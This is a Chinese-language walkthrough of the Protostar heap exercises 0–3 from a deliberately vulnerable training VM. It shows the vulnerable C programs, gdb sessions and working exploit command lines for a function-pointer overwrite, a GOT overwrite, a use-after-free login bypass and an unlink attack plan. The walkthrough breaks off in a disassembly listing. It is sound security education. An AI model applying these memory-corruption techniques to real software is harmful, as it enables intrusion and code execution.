---
title: Exploit Education：Protostar - Heap
---

> The levels to be exploited can be found in the /opt/protostar/bin directory.

## Heap 0

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));  // 64 bytes
  f = malloc(sizeof(struct fp));    // 4 bytes
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

- 需要修改 `f->fp` 的值，使其指向 `winner` 函数
- 查看 `d->name` 溢出后对 `f->fp` 的影响

    ```py
    s = ''
    for i in range(0x41, 0x5b):
        s += chr(i) * 4
    print s
    ```

    ```bash
    $ gdb ./heap0
    (gdb) r `python /tmp/heap.py`

    Starting program: /opt/protostar/bin/heap0 `python /tmp/heap.py`
    data is at 0x804a008, fp is at 0x804a050

    Program received signal SIGSEGV, Segmentation fault.
    0x53535353 in ?? () # S
    ```

- `winner` 函数的地址

    ```bash
    (gdb) x winner 
    0x8048464 <winner>:	0x83e58955
    ```

### Exploit

```bash
$ ./heap0 $(python -c "print 'A' * 72 + '\x64\x84\x04\x08'")
data is at 0x804a008, fp is at 0x804a050
level passed
```

## Heap 1

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  // i1 points to the start of 8 bytes in memory
  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8); // i1 + 4

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);    // 超过 8 字节将会影响 i2 对应的内存
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

- 查看 `i1->name` 溢出对 `i2->name` 的影响
    - 可以改变 `i2->name` 的值，从而能通过 `strcpy` 写入任意地址

    ```bash
    $ gdb ./heap1
    (gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGG 00001111222233334444
    Starting program: /opt/protostar/bin/heap1 AAAABBBBCCCCDDDDEEEEFFFFGGGG 00001111222233334444

    Program received signal SIGSEGV, Segmentation fault.
    *__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, # F
        src=0xbffff8a1 "00001111222233334444") at strcpy.c:40
    40	strcpy.c: No such file or directory.
        in strcpy.c
    ```

- 注意到最后调用了 `printf` 函数，可以覆盖其 GOT 表条目

    ```bash
    (gdb) set disassembly-flavor intel
    (gdb) disassemble main
    Dump of assembler code for function main:
    0x080484b9 <main+0>:	push   ebp
    0x080484ba <main+1>:	mov    ebp,esp
    0x080484bc <main+3>:	and    esp,0xfffffff0
    0x080484bf <main+6>:	sub    esp,0x20
    0x080484c2 <main+9>:	mov    DWORD PTR [esp],0x8
    0x080484c9 <main+16>:	call   0x80483bc <malloc@plt>
    0x080484ce <main+21>:	mov    DWORD PTR [esp+0x14],eax
    0x080484d2 <main+25>:	mov    eax,DWORD PTR [esp+0x14]
    0x080484d6 <main+29>:	mov    DWORD PTR [eax],0x1
    0x080484dc <main+35>:	mov    DWORD PTR [esp],0x8
    0x080484e3 <main+42>:	call   0x80483bc <malloc@plt>
    0x080484e8 <main+47>:	mov    edx,eax
    0x080484ea <main+49>:	mov    eax,DWORD PTR [esp+0x14]
    0x080484ee <main+53>:	mov    DWORD PTR [eax+0x4],edx
    0x080484f1 <main+56>:	mov    DWORD PTR [esp],0x8
    0x080484f8 <main+63>:	call   0x80483bc <malloc@plt>
    0x080484fd <main+68>:	mov    DWORD PTR [esp+0x18],eax
    0x08048501 <main+72>:	mov    eax,DWORD PTR [esp+0x18]
    0x08048505 <main+76>:	mov    DWORD PTR [eax],0x2
    0x0804850b <main+82>:	mov    DWORD PTR [esp],0x8
    0x08048512 <main+89>:	call   0x80483bc <malloc@plt>
    0x08048517 <main+94>:	mov    edx,eax
    0x08048519 <main+96>:	mov    eax,DWORD PTR [esp+0x18]
    0x0804851d <main+100>:	mov    DWORD PTR [eax+0x4],edx
    0x08048520 <main+103>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048523 <main+106>:	add    eax,0x4
    0x08048526 <main+109>:	mov    eax,DWORD PTR [eax]
    0x08048528 <main+111>:	mov    edx,eax
    0x0804852a <main+113>:	mov    eax,DWORD PTR [esp+0x14]
    0x0804852e <main+117>:	mov    eax,DWORD PTR [eax+0x4]
    0x08048531 <main+120>:	mov    DWORD PTR [esp+0x4],edx
    0x08048535 <main+124>:	mov    DWORD PTR [esp],eax
    0x08048538 <main+127>:	call   0x804838c <strcpy@plt>
    0x0804853d <main+132>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08048540 <main+135>:	add    eax,0x8
    0x08048543 <main+138>:	mov    eax,DWORD PTR [eax]
    0x08048545 <main+140>:	mov    edx,eax
    0x08048547 <main+142>:	mov    eax,DWORD PTR [esp+0x18]
    0x0804854b <main+146>:	mov    eax,DWORD PTR [eax+0x4]
    0x0804854e <main+149>:	mov    DWORD PTR [esp+0x4],edx
    0x08048552 <main+153>:	mov    DWORD PTR [esp],eax
    0x08048555 <main+156>:	call   0x804838c <strcpy@plt>
    0x0804855a <main+161>:	mov    DWORD PTR [esp],0x804864b
    0x08048561 <main+168>:	call   0x80483cc <puts@plt> # 由于编译优化，实际上调用的是 puts
    0x08048566 <main+173>:	leave  
    0x08048567 <main+174>:	ret    
    End of assembler dump.
    (gdb) disassemble 0x80483cc
    Dump of assembler code for function puts@plt:
    0x080483cc <puts@plt+0>:	jmp    DWORD PTR ds:0x8049774
    0x080483d2 <puts@plt+6>:	push   0x30
    0x080483d7 <puts@plt+11>:	jmp    0x804835c
    End of assembler dump.
    (gdb) x 0x8049774
    0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483d2
    ```

- `winner` 函数的地址

    ```bash
    (gdb) x winner 
    0x8048494 <winner>:	0x83e58955
    ```

### Exploit

```bash
$ ./heap1 `python -c "print 'A' * 20 + '\x74\x97\x04\x08'"` `python -c "print '\x94\x84\x04\x08'"`
and we have a winner @ 1662252909
$ ./heap1 "`echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`echo -ne "\x94\x84\x04\x08"`"
and we have a winner @ 1662253600
$ ./heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
and we have a winner @ 1662256772
# 在 gdb 中需要使用 /bin/echo，使用 echo 将不解析参数 -ne 而是直接输出
```

### Additional

关于在 `gdb` 中使用 `echo` 不能成功的问题

```bash
$ gdb ./heap1
(gdb) break *0x080484ce
Breakpoint 1 at 0x80484ce: file heap1/heap1.c, line 23.
(gdb) break *0x0804853d
Breakpoint 2 at 0x804853d: file heap1/heap1.c, line 32.
(gdb) r "`echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`echo -ne "\x94\x84\x04\x08"`"
Starting program: /opt/protostar/bin/heap1 "`echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`echo -ne "\x94\x84\x04\x08"`"

Breakpoint 1, 0x080484ce in main (argc=3, argv=0xbffff714) at heap1/heap1.c:23
23	in heap1/heap1.c
(gdb) info registers 
eax            0x804a008	134520840
ecx            0xb7fd93a0	-1208118368
edx            0x804a000	134520832
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff640	0xbffff640
ebp            0xbffff668	0xbffff668
esi            0x0	0
edi            0x0	0
eip            0x80484ce	0x80484ce <main+21>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) set $i1 = (struct internet*)0x804a008
(gdb) print *$i1
$1 = {priority = 0, name = 0x0}
(gdb) c
Continuing.

Breakpoint 2, main (argc=3, argv=0xbffff714) at heap1/heap1.c:32
32	in heap1/heap1.c
(gdb) print *$i1
$2 = {priority = 1, 
  name = 0x804a018 "-ne AAAABBBBCCCCDDDDEEEE\\x74\\x97\\x04\\x08"}
```

## Heap 2

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));    // new allocated area can have old data
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
      // strdup(s) returns a pointer to a new string which is a duplicate of the string s. Memory for the new string is obtained with malloc.
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {  // use after free
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

- 使用测试

    ```bash
    $ ./heap2
    [ auth = (nil), service = (nil) ]
    auth admin
    [ auth = 0x804c008, service = (nil) ]
    login
    please enter your password
    [ auth = 0x804c008, service = (nil) ]
    reset
    [ auth = 0x804c008, service = (nil) ]
    login
    please enter your password
    [ auth = 0x804c008, service = (nil) ]
    service hack
    [ auth = 0x804c008, service = 0x804c008 ]
    # auth was freed and service got that free space there
    ```

- 使用 `gdb` 查看堆的使用情况

    ??? note "Dump of assembler code for function main"

        ```bash
        (gdb) set disassembly-flavor intel
        (gdb) disassemble main 
        Dump of assembler code for function main:
        0x08048934 <main+0>:	push   ebp
        0x08048935 <main+1>:	mov    ebp,esp
        0x08048937 <main+3>:	and    esp,0xfffffff0
        0x0804893a <main+6>:	sub    esp,0x90
        0x08048940 <main+12>:	jmp    0x8048943 <main+15>
        0x08048942 <main+14>:	nop
        0x08048943 <main+15>:	mov    ecx,DWORD PTR ds:0x804b5f8
        0x08048949 <main+21>:	mov    edx,DWORD PTR ds:0x804b5f4
        0x0804894f <main+27>:	mov    eax,0x804ad70
        0x08048954 <main+32>:	mov    DWORD PTR [esp+0x8],ecx
        0x08048958 <main+36>:	mov    DWORD PTR [esp+0x4],edx
        0x0804895c <main+40>:	mov    DWORD PTR [esp],eax
        0x0804895f <main+43>:	call   0x804881c <printf@plt>
        0x08048964 <main+48>:	mov    eax,ds:0x804b164
        0x08048969 <main+53>:	mov    DWORD PTR [esp+0x8],eax
        0x0804896d <main+57>:	mov    DWORD PTR [esp+0x4],0x80
        0x08048975 <main+65>:	lea    eax,[esp+0x10]
        0x08048979 <main+69>:	mov    DWORD PTR [esp],eax
        0x0804897c <main+72>:	call   0x80487ac <fgets@plt>
        0x08048981 <main+77>:	test   eax,eax
        0x08048983 <main+79>:	jne    0x8048987 <main+83>
        0x08048985 <main+81>:	leave  
        0x08048986 <main+82>:	ret    
        0x08048987 <main+83>:	mov    DWORD PTR [esp+0x8],0x5
        0x0804898f <main+91>:	mov    DWORD PTR [esp+0x4],0x804ad8d
        0x08048997 <main+99>:	lea    eax,[esp+0x10]
        0x0804899b <main+103>:	mov    DWORD PTR [esp],eax
        0x0804899e <main+106>:	call   0x804884c <strncmp@plt>
        0x080489a3 <main+111>:	test   eax,eax
        0x080489a5 <main+113>:	jne    0x8048a01 <main+205>
        0x080489a7 <main+115>:	mov    DWORD PTR [esp],0x4
        0x080489ae <main+122>:	call   0x804916a <malloc>
        0x080489b3 <main+127>:	mov    ds:0x804b5f4,eax
        0x080489b8 <main+132>:	mov    eax,ds:0x804b5f4
        0x080489bd <main+137>:	mov    DWORD PTR [esp+0x8],0x4
        0x080489c5 <main+145>:	mov    DWORD PTR [esp+0x4],0x0
        0x080489cd <main+153>:	mov    DWORD PTR [esp],eax
        0x080489d0 <main+156>:	call   0x80487bc <memset@plt>
        0x080489d5 <main+161>:	lea    eax,[esp+0x10]
        0x080489d9 <main+165>:	add    eax,0x5
        0x080489dc <main+168>:	mov    DWORD PTR [esp],eax
        0x080489df <main+171>:	call   0x80487fc <strlen@plt>
        0x080489e4 <main+176>:	cmp    eax,0x1e
        0x080489e7 <main+179>:	ja     0x8048a01 <main+205>
        0x080489e9 <main+181>:	lea    eax,[esp+0x10]
        0x080489ed <main+185>:	lea    edx,[eax+0x5]
        0x080489f0 <main+188>:	mov    eax,ds:0x804b5f4
        0x080489f5 <main+193>:	mov    DWORD PTR [esp+0x4],edx
        0x080489f9 <main+197>:	mov    DWORD PTR [esp],eax
        0x080489fc <main+200>:	call   0x804880c <strcpy@plt>
        0x08048a01 <main+205>:	mov    DWORD PTR [esp+0x8],0x5
        0x08048a09 <main+213>:	mov    DWORD PTR [esp+0x4],0x804ad93
        0x08048a11 <main+221>:	lea    eax,[esp+0x10]
        0x08048a15 <main+225>:	mov    DWORD PTR [esp],eax
        0x08048a18 <main+228>:	call   0x804884c <strncmp@plt>
        0x08048a1d <main+233>:	test   eax,eax
        0x08048a1f <main+235>:	jne    0x8048a2e <main+250>
        0x08048a21 <main+237>:	mov    eax,ds:0x804b5f4
        0x08048a26 <main+242>:	mov    DWORD PTR [esp],eax
        0x08048a29 <main+245>:	call   0x804999c <free>
        0x08048a2e <main+250>:	mov    DWORD PTR [esp+0x8],0x6
        0x08048a36 <main+258>:	mov    DWORD PTR [esp+0x4],0x804ad99
        0x08048a3e <main+266>:	lea    eax,[esp+0x10]
        0x08048a42 <main+270>:	mov    DWORD PTR [esp],eax
        0x08048a45 <main+273>:	call   0x804884c <strncmp@plt>
        0x08048a4a <main+278>:	test   eax,eax
        0x08048a4c <main+280>:	jne    0x8048a62 <main+302>
        0x08048a4e <main+282>:	lea    eax,[esp+0x10]
        0x08048a52 <main+286>:	add    eax,0x7
        0x08048a55 <main+289>:	mov    DWORD PTR [esp],eax
        0x08048a58 <main+292>:	call   0x804886c <strdup@plt>
        0x08048a5d <main+297>:	mov    ds:0x804b5f8,eax
        0x08048a62 <main+302>:	mov    DWORD PTR [esp+0x8],0x5
        0x08048a6a <main+310>:	mov    DWORD PTR [esp+0x4],0x804ada1
        0x08048a72 <main+318>:	lea    eax,[esp+0x10]
        0x08048a76 <main+322>:	mov    DWORD PTR [esp],eax
        0x08048a79 <main+325>:	call   0x804884c <strncmp@plt>
        0x08048a7e <main+330>:	test   eax,eax
        0x08048a80 <main+332>:	jne    0x8048942 <main+14>
        0x08048a86 <main+338>:	mov    eax,ds:0x804b5f4
        0x08048a8b <main+343>:	mov    eax,DWORD PTR [eax+0x20]
        0x08048a8e <main+346>:	test   eax,eax
        0x08048a90 <main+348>:	je     0x8048aa3 <main+367>
        0x08048a92 <main+350>:	mov    DWORD PTR [esp],0x804ada7
        0x08048a99 <main+357>:	call   0x804883c <puts@plt>
        0x08048a9e <main+362>:	jmp    0x8048943 <main+15>
        0x08048aa3 <main+367>:	mov    DWORD PTR [esp],0x804adc3
        0x08048aaa <main+374>:	call   0x804883c <puts@plt>
        0x08048aaf <main+379>:	jmp    0x8048943 <main+15>
        End of assembler dump.
        ```

    ```bash
    (gdb) r
    Starting program: /opt/protostar/bin/heap2 
    [ auth = (nil), service = (nil) ]
    auth admin
    [ auth = 0x804c008, service = (nil) ]
    ^C
    Program received signal SIGINT, Interrupt.
    0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
    82	../sysdeps/unix/syscall-template.S: No such file or directory.
      in ../sysdeps/unix/syscall-template.S
    Current language:  auto
    The current source language is "auto; currently asm".
    (gdb) info proc mappings
    process 7281
    cmdline = '/opt/protostar/bin/heap2'
    cwd = '/opt/protostar/bin'
    exe = '/opt/protostar/bin/heap2'
    Mapped address spaces:

      Start Addr   End Addr       Size     Offset objfile
      0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap2
      0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap2
      0x804c000  0x804d000     0x1000          0           [heap]
      0xb7e96000 0xb7e97000     0x1000          0        
      0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
      0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
      0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
      0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
      0xb7fd9000 0xb7fdc000     0x3000          0        
      0xb7fde000 0xb7fe2000     0x4000          0        
      0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
      0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
      0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
      0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
      0xbffeb000 0xc0000000    0x15000          0           [stack]
    (gdb) break *0x0804895f # call   0x804881c <printf@plt>
    Breakpoint 1 at 0x804895f: file heap2/heap2.c, line 20.
    (gdb) command  # define what gdb commands shall be executed when the breakpoint is hit
    Type commands for when breakpoint 1 is hit, one per line.
    End with a line saying just "end".
    >echo -------------------------------------------------\n
    >x/20wx 0x804c000 # print the heap
    >echo --------auth-------------------------------------\n
    >print *auth
    >echo --------service----------------------------------\n
    >print service
    >echo -------------------------------------------------\n
    >continue
    >end
    ```

    ```bash
    (gdb) r
    Starting program: /opt/protostar/bin/heap2 

    Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff754) at heap2/heap2.c:20
    20	in heap2/heap2.c
    Current language:  auto
    The current source language is "auto; currently c".
    -------------------------------------------------
    0x804c000:	Cannot access memory at address 0x804c000
    (gdb) c
    Continuing.
    [ auth = (nil), service = (nil) ]
    auth admin

    Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff754) at heap2/heap2.c:20
    20	in heap2/heap2.c
    -------------------------------------------------
    0x804c000:	0x00000000	0x00000011	0x696d6461	0x00000a6e
    # 实际上 sizeof(auth) 返回的是指针 auth 的大小（4 bytes）而不是结构体 auth
    # 考虑到对齐，所以这里只分配了 8 字节（8 bytes header + 8 bytes data）
    0x804c010:	0x00000000	0x00000ff1	0x00000000	0x00000000
    0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
    --------auth-------------------------------------
    $5 = {name = "admin\n\000\000\000\000\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
    --------service----------------------------------
    $6 = 0x0
    -------------------------------------------------
    [ auth = 0x804c008, service = (nil) ]
    reset

    Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff754) at heap2/heap2.c:20
    20	in heap2/heap2.c
    -------------------------------------------------
    # the first word of the chunk data got replaced with 0
    # because the first word in a free chunk is defined as the previous free chunk address
    # free chunks 是链表，因为没有其它 free chunk，所以为空
    0x804c000:	0x00000000	0x00000011	0x00000000	0x00000a6e
    0x804c010:	0x00000000	0x00000ff1	0x00000000	0x00000000
    0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
    --------auth-------------------------------------
    $7 = {name = "\000\000\000\000n\n\000\000\000\000\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
    --------service----------------------------------
    $8 = 0x0
    -------------------------------------------------
    [ auth = 0x804c008, service = (nil) ]
    service AAA

    Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff754) at heap2/heap2.c:20
    20	in heap2/heap2.c
    -------------------------------------------------
    0x804c000:	0x00000000	0x00000011	0x41414120	0x0000000a
    0x804c010:	0x00000000	0x00000ff1	0x00000000	0x00000000
    0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
    --------auth-------------------------------------
    $9 = {name = " AAA\n\000\000\000\000\000\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
    --------service----------------------------------
    $10 = 0x804c008 " AAA\n"
    -------------------------------------------------
    [ auth = 0x804c008, service = 0x804c008 ]
    service BBB

    Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff754) at heap2/heap2.c:20
    20	in heap2/heap2.c
    -------------------------------------------------
    0x804c000:	0x00000000	0x00000011	0x41414120	0x0000000a
    0x804c010:	0x00000000	0x00000011	0x42424220	0x0000000a
    0x804c020:	0x00000000	0x00000fe1	0x00000000	0x00000000
    0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
    --------auth-------------------------------------
    $11 = {name = " AAA\n\000\000\000\000\000\000\000\021\000\000\000 BBB\n\000\000\000\000\000\000\000\341\017\000", auth = 0}
    --------service----------------------------------
    $12 = 0x804c018 " BBB\n"
    -------------------------------------------------
    [ auth = 0x804c008, service = 0x804c018 ]
    service CCC

    Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff754) at heap2/heap2.c:20
    20	in heap2/heap2.c
    -------------------------------------------------
    0x804c000:	0x00000000	0x00000011	0x41414120	0x0000000a
    0x804c010:	0x00000000	0x00000011	0x42424220	0x0000000a
    0x804c020:	0x00000000	0x00000011	0x43434320	0x0000000a
    0x804c030:	0x00000000	0x00000fd1	0x00000000	0x00000000
    0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
    --------auth-------------------------------------
    # struct auth {
    #   char name[32];
    #   int auth;
    # };
    # 0x804c008 + 0x20 = 0x804c028
    $13 = {name = " AAA\n\000\000\000\000\000\000\000\021\000\000\000 BBB\n\000\000\000\000\000\000\000\021\000\000", auth = 1128481568}  # 0x43434320
    --------service----------------------------------
    $14 = 0x804c028 " CCC\n"
    -------------------------------------------------
    [ auth = 0x804c008, service = 0x804c028 ]
    login
    you have logged in already!
    ```

- 由于动态分配大小错误，也可以直接覆盖

    ```bash
    (gdb) r
    Starting program: /opt/protostar/bin/heap2 

    Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff754) at heap2/heap2.c:20
    20	in heap2/heap2.c
    Current language:  auto
    The current source language is "auto; currently c".
    -------------------------------------------------
    0x804c000:	Cannot access memory at address 0x804c000
    (gdb) c
    Continuing.
    [ auth = (nil), service = (nil) ]
    auth admin

    Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff754) at heap2/heap2.c:20
    20	in heap2/heap2.c
    -------------------------------------------------
    0x804c000:	0x00000000	0x00000011	0x696d6461	0x00000a6e
    0x804c010:	0x00000000	0x00000ff1	0x00000000	0x00000000
    0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
    --------auth-------------------------------------
    $17 = {name = "admin\n\000\000\000\000\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
    --------service----------------------------------
    $18 = 0x0
    -------------------------------------------------
    [ auth = 0x804c008, service = (nil) ]
    service AAAAAAAAAAAAAAAAAAAAAAAAAAA

    Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff754) at heap2/heap2.c:20
    20	in heap2/heap2.c
    -------------------------------------------------
    0x804c000:	0x00000000	0x00000011	0x696d6461	0x00000a6e
    0x804c010:	0x00000000	0x00000029	0x41414120	0x41414141
    0x804c020:	0x41414141	0x41414141	0x41414141	0x41414141
    0x804c030:	0x41414141	0x0000000a	0x00000000	0x00000fc9
    0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
    --------auth-------------------------------------
    $19 = {name = "admin\n\000\000\000\000\000\000)\000\000\000 ", 'A' <repeats 15 times>, auth = 1094795585}
    --------service----------------------------------
    $20 = 0x804c018 " ", 'A' <repeats 27 times>, "\n"
    -------------------------------------------------
    [ auth = 0x804c008, service = 0x804c018 ]
    login
    you have logged in already!
    ```

### Exploit

```bash
# use after free
$ ./heap2
[ auth = (nil), service = (nil) ]
auth admin
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service AAA
[ auth = 0x804c008, service = 0x804c008 ]
service BBB
[ auth = 0x804c008, service = 0x804c018 ]
service CCC
[ auth = 0x804c008, service = 0x804c028 ]
login
you have logged in already!
```

```bash
# simple overwrite
$ ./heap2
[ auth = (nil), service = (nil) ]
auth admin
[ auth = 0x804c008, service = (nil) ]
service AAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
```

## Heap 3

> the Doug Lea Malloc (dlmalloc)

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]); // can't deal with null bytes
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

- 通过 [`malloc`](../static/malloc.c) 的 `unlink` 修改 `GOT` 表条目，`FD->bk` 对应目标 `GOT` 表条目地址，`BK` 指向 shellcode 的起始地址
    - 注意有 `BK->fd` 写回

    ```c
    #define unlink(P, BK, FD) {
      FD = P->fd;              
      BK = P->bk;              
      FD->bk = BK;             
      BK->fd = FD;             
    }
    ```

- Overflow `b` 修改 `c` 对应 chunk 的大小使其大于 `MAX_FAST_SIZE 80`，Overflow `c` 来构造 fake chunk 控制 `unlink`，用于调用函数 `winner` 的 shellcode 可放于 `a` 中
    - fake chunk 的 `prev_inuse` 位需设置为 0
    - 注意 `free` 会修改 chunk 的 forward pointer，即 data 域的首 $4$ 字节

        |prev_size|size|<span style="color: red">fd</span>|bk|
        -|-|-|-

- fake chunk 的 next chunk 的 `prev_inuse` 位同样应为 0，从而能调用 `unlink`

    ```c
    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

    if (!nextinuse) {
      unlink(nextchunk, bck, fwd);
      size += nextsize;
    } else
    clear_inuse_bit_at_offset(nextchunk, 0);
    ```

- next chunk 的起始地址根据当前 chunk 的起始地址和 size 进行计算，可以设置 size 为 `0xfffffffc`，实际计算等同于 -4，避免了 null 字节也无需再构造一个 chunk
- 查看相关地址信息

    ??? note "Dump of assembler code for function main"

        ```bash
        (gdb) set disassembly-flavor intel
        (gdb) disassemble main
        Dump of assembler code for function main:
        0x08048889 <main+0>:	push   ebp
        0x0804888a <main+1>:	mov    ebp,esp
        0x0804888c <main+3>:	and    esp,0xfffffff0
        0x0804888f <main+6>:	sub    esp,0x20
        0x08048892 <main+9>:	mov    DWORD PTR [esp],0x20
        0x08048899 <main+16>:	call   0x8048ff2 <malloc>
        0x0804889e <main+21>:	mov    DWORD PTR [esp+0x14],eax
        0x080488a2 <main+25>:	mov    DWORD PTR [esp],0x20
        0x080488a9 <main+32>:	call   0x8048ff2 <malloc>
        0x080488ae <main+37>:	mov    DWORD PTR [esp+0x18],eax
        0x080488b2 <main+41>:	mov    DWORD PTR [esp],0x20
        0x080488b9 <main+48>:	call   0x8048ff2 <malloc>
        0x080488be <main+53>:	mov    DWORD PTR [esp+0x1c],eax
        0x080488c2 <main+57>:	mov    eax,DWORD PTR [ebp+0xc]
        0x080488c5 <main+60>:	add    eax,0x4
        0x080488c8 <main+63>:	mov    eax,DWORD PTR [eax]
        0x080488ca <main+65>:	mov    DWORD PTR [esp+0x4],eax
        0x080488ce <main+69>:	mov    eax,DWORD PTR [esp+0x14]
        0x080488d2 <main+73>:	mov    DWORD PTR [esp],eax
        0x080488d5 <main+76>:	call   0x8048750 <strcpy@plt>
        0x080488da <main+81>:	mov    eax,DWORD PTR [ebp+0xc]
        0x080488dd <main+84>:	add    eax,0x8
        0x080488e0 <main+87>:	mov    eax,DWORD PTR [eax]
        0x080488e2 <main+89>:	mov    DWORD PTR [esp+0x4],eax
        0x080488e6 <main+93>:	mov    eax,DWORD PTR [esp+0x18]
        0x080488ea <main+97>:	mov    DWORD PTR [esp],eax
        0x080488ed <main+100>:	call   0x8048750 <strcpy@plt>
        0x080488f2 <main+105>:	mov    eax,DWORD PTR [ebp+0xc]
        0x080488f5 <main+108>:	add    eax,0xc
        0x080488f8 <main+111>:	mov    eax,DWORD PTR [eax]
        0x080488fa <main+113>:	mov    DWORD PTR [esp+0x4],eax
        0x080488fe <main+117>:	mov    eax,DWORD PTR [esp+0x1c]
        0x08048902 <main+121>:	mov    DWORD PTR [esp],eax
        0x08048905 <main+124>:	call   0x8048750 <strcpy@plt>
        0x0804890a <main+129>:	mov    eax,DWORD PTR [esp+0x1c]
        0x0804890e <main+133>:	mov    DWORD PTR [esp],eax
        0x08048911 <main+136>:	call   0x8049824 <free>
        0x08048916 <main+141>:	mov    eax,DWORD PTR [esp+0x18]
        0x0804891a <main+145>:	mov    DWORD PTR [esp],eax
        0x0804891d <main+148>:	call   0x8049824 <free>
        0x08048922 <main+153>:	mov    eax,DWORD PTR [esp+0x14]
        0x08048926 <main+157>:	mov    DWORD PTR [esp],eax
        0x08048929 <main+160>:	call   0x8049824 <free>
        0x0804892e <main+165>:	mov    DWORD PTR [esp],0x804ac27
        0x08048935 <main+172>:	call   0x8048790 <puts@plt>
        0x0804893a <main+177>:	leave  
        0x0804893b <main+178>:	ret    
        End of assembler dump.
